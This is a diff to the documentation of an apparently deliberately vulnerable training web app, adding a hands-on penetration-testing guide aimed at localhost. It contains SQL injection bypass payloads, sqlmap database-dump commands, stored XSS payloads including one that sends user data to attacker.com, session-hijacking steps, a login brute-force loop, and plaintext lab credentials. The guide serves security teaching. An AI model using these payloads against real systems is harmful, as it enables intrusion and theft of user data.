@@ -471,13 +471,583 @@ This application contains 15 intentional security vulnerabilities organized by s
 
 ---
 
-## Testing Tools Recommended
+## Penetration Testing Tools & Setup
 
-1. **Burp Suite Community** - HTTP interception and manipulation
-2. **Browser DevTools** - Network inspection, JavaScript console
-3. **SQLmap** - Automated SQL injection testing
-4. **curl** - Command-line API testing
-5. **Postman** - API endpoint testing
+### Essential Tools for This Application
+
+This section provides detailed setup and usage instructions for the most effective tools to test Manchester Fresh Foods.
+
+### 1. Burp Suite Community Edition
+
+**Purpose**: HTTP request interception, manipulation, and repeating  
+**Best for**: IDOR testing, session analysis, CSRF testing, manual SQL injection
+
+**Setup:**
+1. Download from [portswigger.net/burp/communitydownload](https://portswigger.net/burp/communitydownload)
+2. Configure your browser proxy to `127.0.0.1:8080`
+3. Import Burp's CA certificate to avoid SSL warnings
+
+**Testing Manchester Fresh Foods:**
+
+**Example 1: IDOR Testing**
+```
+1. Proxy → Intercept: ON
+2. Login as thepubco and navigate to My Orders
+3. Click on an order (note the UUID in the request)
+4. Right-click request → Send to Repeater
+5. Logout, login as bella_italia
+6. In Repeater, change the order UUID to thepubco's order
+7. Click Send - observe unauthorized access!
+```
+
+**Example 2: SQL Injection Testing**
+```
+1. Intercept login POST to /api/login
+2. Send to Intruder
+3. Set payload position: username=§admin§
+4. Load SQL injection payloads from Burp's built-in list
+5. Start attack and observe responses
+6. Look for authentication bypass (200 status with session cookie)
+```
+
+**Example 3: Session Token Analysis**
+```
+1. Login/logout multiple times
+2. Send all login responses to Sequencer
+3. Analyze token randomness
+4. Observe predictable pattern: sess_1000_timestamp, sess_1001_timestamp, etc.
+```
+
+---
+
+### 2. OWASP ZAP (Zed Attack Proxy)
+
+**Purpose**: Automated scanning and passive vulnerability detection  
+**Best for**: Quick reconnaissance, finding common vulnerabilities, generating reports  
+**Free alternative to Burp Suite Professional**
+
+**Installation:**
+```bash
+# Ubuntu/Debian
+sudo apt install zaproxy
+
+# macOS
+brew install --cask owasp-zap
+
+# Windows: Download from https://www.zaproxy.org/download/
+```
+
+**Automated Scan Against Manchester Fresh Foods:**
+
+**Quick Scan (5 minutes):**
+```
+1. Open ZAP
+2. Automated Scan → Enter: http://localhost:5000
+3. Attack → Select all scan policies
+4. Start Scan
+5. Review Alerts tab after completion
+```
+
+**Manual Explore + Active Scan (Recommended):**
+```
+1. HUD Mode: Firefox/Chrome with ZAP browser extension
+2. Manually browse the application while logged in
+3. ZAP will automatically discover all endpoints
+4. Right-click site → Attack → Active Scan
+5. Export report: Report → Generate HTML Report
+```
+
+**Testing Specific Endpoints:**
+```bash
+# Using ZAP CLI (after installation)
+
+# Scan login endpoint for SQL injection
+zap-cli quick-scan --self-contained \
+  --spider -r \
+  --ajax-spider \
+  http://localhost:5000/login
+
+# Scan product search
+zap-cli quick-scan \
+  http://localhost:5000/products
+```
+
+**Expected Findings:**
+- ✅ SQL Injection in login form
+- ✅ Missing CSRF tokens
+- ✅ Weak session cookies
+- ✅ XSS in profile bio
+- ✅ Verbose error messages
+
+---
+
+### 3. SQLmap - Automated SQL Injection
+
+**Purpose**: Database extraction through SQL injection  
+**Best for**: Extracting complete database, testing blind SQL injection
+
+**Installation:**
+```bash
+# Linux/macOS
+git clone --depth 1 https://github.com/sqlmapproject/sqlmap.git
+cd sqlmap
+
+# Or use package manager
+sudo apt install sqlmap  # Ubuntu/Debian
+brew install sqlmap      # macOS
+```
+
+**Manchester Fresh Foods Specific Commands:**
+
+**Test 1: Login Form SQL Injection**
+```bash
+# Save login request from Burp Suite to login-request.txt, then:
+
+# Detect SQL injection
+sqlmap -r login-request.txt --batch --dbms=SQLite
+
+# Extract database names
+sqlmap -r login-request.txt --dbs --dbms=SQLite
+
+# List all tables
+sqlmap -r login-request.txt --tables --dbms=SQLite
+
+# Dump users table (plaintext passwords!)
+sqlmap -r login-request.txt -T users --dump --dbms=SQLite
+
+# Dump ALL data (orders, products, customers)
+sqlmap -r login-request.txt --dump-all --dbms=SQLite --exclude-sysdbs
+```
+
+**Test 2: Product Search SQL Injection**
+```bash
+# Test product search endpoint
+sqlmap -u "http://localhost:5000/api/products/search?query=tomato" \
+  --batch --dbms=SQLite \
+  --level=5 --risk=3
+
+# Extract product table
+sqlmap -u "http://localhost:5000/api/products/search?query=tomato" \
+  --dbms=SQLite -T products --dump
+```
+
+**Test 3: Order IDOR + SQL Injection**
+```bash
+# First, get a valid session cookie by logging in
+# Copy connect.sid value from browser DevTools
+
+sqlmap -u "http://localhost:5000/api/orders/ORDER_UUID_HERE" \
+  --cookie="connect.sid=YOUR_SESSION_COOKIE" \
+  --dbms=SQLite \
+  --dump -T orders
+```
+
+**SQLmap Output Interpretation:**
+```
+[INFO] testing 'SQLite inline queries'
+✅ VULNERABLE! Parameter 'username' is vulnerable
+
+[INFO] fetching database names
+[INFO] fetching tables for database: 'main'
+Database: SQLite_masterdb
+[6 tables]
++---------------------+
+| contact_submissions |
+| order_items         |
+| orders              |
+| products            |
+| reviews             |
+| users               |
++---------------------+
+
+Database: SQLite_masterdb
+Table: users
+[7 entries]
++----------+------------+-----------+---------+
+| username | password   | role      | company |
++----------+------------+-----------+---------+
+| admin    | admin123   | admin     | NULL    |
+| thepubco | welcome123 | customer  | The Pub Company Ltd |
+...
+```
+
+---
+
+### 4. Nikto - Web Server Scanner
+
+**Purpose**: Reconnaissance and configuration testing  
+**Best for**: Finding hidden files, information disclosure, server misconfigurations
+
+**Installation:**
+```bash
+sudo apt install nikto     # Ubuntu/Debian
+brew install nikto         # macOS
+```
+
+**Scan Manchester Fresh Foods:**
+```bash
+# Basic scan
+nikto -h http://localhost:5000
+
+# Comprehensive scan with all plugins
+nikto -h http://localhost:5000 -Tuning x
+
+# Save results
+nikto -h http://localhost:5000 -o nikto-report.html -Format html
+```
+
+**Expected Findings:**
+- ✅ Missing security headers (X-Frame-Options, CSP)
+- ✅ Potential directory listings
+- ✅ Information disclosure in error pages
+- ✅ Session cookie without Secure/HttpOnly flags
+
+---
+
+### 5. Browser Extensions for Penetration Testing
+
+**Cookie Editor (Chrome/Firefox)**
+- **Purpose**: Manipulate session cookies for hijacking tests
+- **Install**: Chrome Web Store / Firefox Add-ons
+- **Use case**: Change session ID to hijack another user's session
+
+**Example:**
+```
+1. Login as thepubco
+2. Open Cookie Editor
+3. Note session cookie: connect.sid=sess_1000_1699876543
+4. Increment counter: sess_1001_1699876543
+5. Refresh page → You've hijacked bella_italia's session!
+```
+
+**EditThisCookie (Chrome)**
+- Similar functionality to Cookie Editor
+- Export/import cookies for session replay
+
+**Wappalyzer**
+- **Purpose**: Technology detection
+- **Expected results**: React, Express.js, Tailwind CSS
+
+**FoxyProxy**
+- **Purpose**: Quick proxy switching for Burp Suite/ZAP
+- **Setup**: Add proxy profile for 127.0.0.1:8080
+
+---
+
+### 6. curl - Command-Line Testing
+
+**Purpose**: Quick API endpoint testing, scripting attacks  
+**Best for**: Automation, IDOR testing, bypass testing
+
+**Manchester Fresh Foods Examples:**
+
+**Test 1: SQL Injection in Login**
+```bash
+# Authentication bypass
+curl -X POST http://localhost:5000/api/login \
+  -H "Content-Type: application/json" \
+  -d '{"username":"'"'"' OR '"'"'1'"'"'='"'"'1'"'"' --","password":"anything"}' \
+  -c cookies.txt \
+  -v
+
+# Check if logged in
+curl http://localhost:5000/api/user \
+  -b cookies.txt
+```
+
+**Test 2: IDOR - Access Other User's Orders**
+```bash
+# Login as thepubco
+curl -X POST http://localhost:5000/api/login \
+  -H "Content-Type: application/json" \
+  -d '{"username":"thepubco","password":"welcome123"}' \
+  -c thepubco-cookies.txt
+
+# Get thepubco's orders
+curl http://localhost:5000/api/orders \
+  -b thepubco-cookies.txt \
+  | jq '.[] | .id'  # Note the order UUIDs
+
+# Login as bella_italia
+curl -X POST http://localhost:5000/api/login \
+  -H "Content-Type: application/json" \
+  -d '{"username":"bella_italia","password":"pasta2024"}' \
+  -c bella-cookies.txt
+
+# Access thepubco's order using bella's session!
+curl http://localhost:5000/api/orders/THEPUBCO_ORDER_UUID \
+  -b bella-cookies.txt
+```
+
+**Test 3: XSS Payload Injection**
+```bash
+# Inject XSS into profile bio
+curl -X POST http://localhost:5000/api/profile \
+  -H "Content-Type: application/json" \
+  -b cookies.txt \
+  -d '{"bio":"<script>alert(document.cookie)</script>","phone":"123-456-7890"}'
+```
+
+**Test 4: Rate Limiting Test**
+```bash
+# Attempt 100 login requests (no rate limiting!)
+for i in {1..100}; do
+  curl -X POST http://localhost:5000/api/login \
+    -H "Content-Type: application/json" \
+    -d '{"username":"admin","password":"test'$i'"}' \
+    -s -o /dev/null -w "%{http_code}\n"
+done
+```
+
+---
+
+### 7. Browser DevTools (Built-in)
+
+**Purpose**: Client-side testing, JavaScript analysis, network inspection  
+**Best for**: XSS testing, session analysis, exposed secrets
+
+**Manchester Fresh Foods Examples:**
+
+**Test 1: Stored XSS**
+```javascript
+// Open DevTools Console on /dashboard/profile
+// Inject payload into bio field:
+<img src=x onerror=alert('XSS')>
+
+// Or more dangerous:
+<script>
+  fetch('/api/user').then(r=>r.json()).then(u=>
+    fetch('https://attacker.com/steal?data='+JSON.stringify(u))
+  )
+</script>
+```
+
+**Test 2: Session Cookie Analysis**
+```javascript
+// Console tab
+document.cookie  // View session cookie
+
+// Application tab → Cookies
+// Check for:
+// ❌ Missing HttpOnly flag
+// ❌ Missing Secure flag  
+// ❌ Missing SameSite attribute
+// ❌ Predictable session ID pattern
+```
+
+**Test 3: Exposed Secrets in Source Code**
+```javascript
+// Sources tab → Search (Ctrl+Shift+F)
+// Search for:
+"api_key"
+"secret"
+"password"
+"token"
+"SESSION_SECRET"
+```
+
+**Test 4: IDOR via Console**
+```javascript
+// Get another user's order
+fetch('/api/orders/UUID_FROM_OTHER_USER')
+  .then(r => r.json())
+  .then(console.log)
+
+// Get another user's profile  
+fetch('/api/profile/DIFFERENT_USER_ID')
+  .then(r => r.json())
+  .then(console.log)
+```
+
+---
+
+### 8. Postman / Insomnia - API Testing
+
+**Purpose**: Structured API testing, collection building  
+**Best for**: Testing authenticated endpoints, building attack workflows
+
+**Manchester Fresh Foods Collection:**
+
+Create a Postman collection with these requests:
+
+```
+1. Login (POST /api/login)
+   - Save session cookie automatically
+   
+2. Get Current User (GET /api/user)
+   - Uses saved session
+   
+3. Get Orders (GET /api/orders)
+   - Test IDOR by manually changing order IDs
+   
+4. Search Products (GET /api/products/search?query=')
+   - SQL injection payloads in query parameter
+   
+5. Update Profile (POST /api/profile)
+   - XSS payloads in bio field
+```
+
+---
+
+## Tool Recommendation Matrix
+
+Match each vulnerability to the best testing tool:
+
+| Vulnerability | Primary Tool | Alternative Tools |
+|--------------|--------------|-------------------|
+| **SQL Injection** | SQLmap, Burp Intruder | curl, ZAP, Manual (DevTools) |
+| **Stored XSS** | Browser DevTools, Burp | ZAP, Manual testing |
+| **IDOR** | Burp Repeater, curl | Postman, DevTools Console |
+| **Weak Passwords** | Burp Intruder, Hydra | Custom Python script |
+| **Session Hijacking** | Cookie Editor, Burp | EditThisCookie, curl |
+| **CSRF** | Burp, Custom HTML form | curl, Postman |
+| **Rate Limiting** | Burp Intruder | curl loop, Python script |
+| **SSRF** | curl, Burp Repeater | Postman |
+| **LFI** | curl, Browser | Burp Repeater |
+| **XXE** | Burp Repeater, curl | Postman |
+| **Info Disclosure** | Nikto, curl | Browser, ZAP Spider |
+| **Plaintext Passwords** | SQLmap (dump users) | Burp (observe responses) |
+| **Predictable Sessions** | Burp Sequencer | Cookie Editor + manual |
+| **Verbose Errors** | ZAP, Nikto | Any tool (trigger errors) |
+| **Exposed Secrets** | Browser DevTools Sources | grep source files |
+
+---
+
+## Complete Penetration Testing Workflow
+
+Follow this methodology to systematically test Manchester Fresh Foods:
+
+### Phase 1: Reconnaissance (30 minutes)
+
+**Goal**: Map the application and identify attack surface
+
+```bash
+# 1. Technology detection
+# Open application in browser with Wappalyzer enabled
+
+# 2. Spider the application
+nikto -h http://localhost:5000
+
+# 3. Manual exploration
+# - Browse all public pages (/, /products, /contact, /login, /register)
+# - Login and explore authenticated pages
+# - Note all forms, inputs, and API endpoints
+
+# 4. Intercept traffic with Burp/ZAP
+# - Enable proxy
+# - Click through entire application
+# - Review Site Map in Burp to see all endpoints discovered
+```
+
+**Expected Endpoints Discovered:**
+```
+Public:
+- GET  /
+- GET  /products
+- GET  /contact
+- GET  /login
+- GET  /register
+- GET  /instructor
+- GET  /api/products
+- GET  /api/products/search?query=
+- POST /api/login
+- POST /api/register
+- POST /api/contact
+
+Authenticated (Customer):
+- GET  /dashboard
+- GET  /dashboard/orders
+- GET  /dashboard/place-order
+- GET  /dashboard/invoices
+- GET  /dashboard/profile
+- GET  /api/user
+- GET  /api/orders
+- GET  /api/orders/:id
+- POST /api/orders
+- POST /api/profile
+
+Admin:
+- All customer endpoints plus full order visibility
+```
+
+---
+
+### Phase 2: Automated Scanning (45 minutes)
+
+**Goal**: Let tools find low-hanging fruit
+
+```bash
+# 1. ZAP Automated Scan
+# Run full automated scan while you work on manual tests
+
+# 2. SQLmap against login
+sqlmap -r login-request.txt --batch --dbms=SQLite --dump-all
+
+# 3. Nikto full scan
+nikto -h http://localhost:5000 -Tuning x -o nikto-report.html -Format html
+```
+
+**Review automated findings and prioritize manual verification**
+
+---
+
+### Phase 3: Manual Exploitation (2-3 hours)
+
+**Test each vulnerability systematically:**
+
+**1. Authentication (30 min)**
+- [ ] SQL injection in login (`' OR '1'='1' --`)
+- [ ] Default credentials (`admin/admin123`)
+- [ ] Weak password policy (register with `a`)
+- [ ] Session predictability (login/logout 5x, analyze pattern)
+
+**2. Authorization (30 min)**
+- [ ] IDOR in orders (access other customer orders)
+- [ ] IDOR in profiles (view/edit other user profiles)
+- [ ] Admin functions accessible to customers
+
+**3. Injection Attacks (45 min)**
+- [ ] SQL injection in product search
+- [ ] Stored XSS in profile bio
+- [ ] Stored XSS in order notes
+- [ ] Stored XSS in contact form
+- [ ] XXE in order import (if implemented)
+
+**4. Information Disclosure (20 min)**
+- [ ] Verbose error messages (trigger errors)
+- [ ] Exposed secrets in JS source
+- [ ] Directory traversal attempts
+- [ ] Database credential exposure
+
+**5. Session Management (20 min)**
+- [ ] Cookie analysis (missing flags)
+- [ ] Session fixation
+- [ ] Session hijacking via predictable IDs
+
+**6. Security Controls (20 min)**
+- [ ] CSRF (create external form)
+- [ ] Rate limiting (100 login attempts)
+- [ ] SSRF (if /api/fetch-document exists)
+- [ ] LFI (if /api/view-document exists)
+
+---
+
+### Phase 4: Documentation (1-2 hours)
+
+For each vulnerability found:
+
+1. **Take screenshots** showing the exploit
+2. **Save HTTP requests/responses** from Burp
+3. **Document exact reproduction steps**
+4. **Assess real-world impact**
+5. **Provide remediation recommendations**
+
+**Deliverable**: Professional penetration test report with:
+- Executive summary
+- Methodology
+- Findings (Critical → Low severity)
+- Evidence for each finding
+- Remediation roadmap
 
 ---
 
@@ -516,7 +1086,7 @@ When documenting vulnerabilities, include:
 
 ## Need Help?
 
-**Instructor Documentation**: Navigate to `/instructor` and enter password `instructor2024` for complete vulnerability details and testing hints.
+**Instructor Documentation**: Navigate to `/instructor` and enter password `penetration-test-2024` for complete vulnerability details and testing hints.
 
 **Stuck on a vulnerability?**: The instructor docs provide:
 - All 15 vulnerability locations
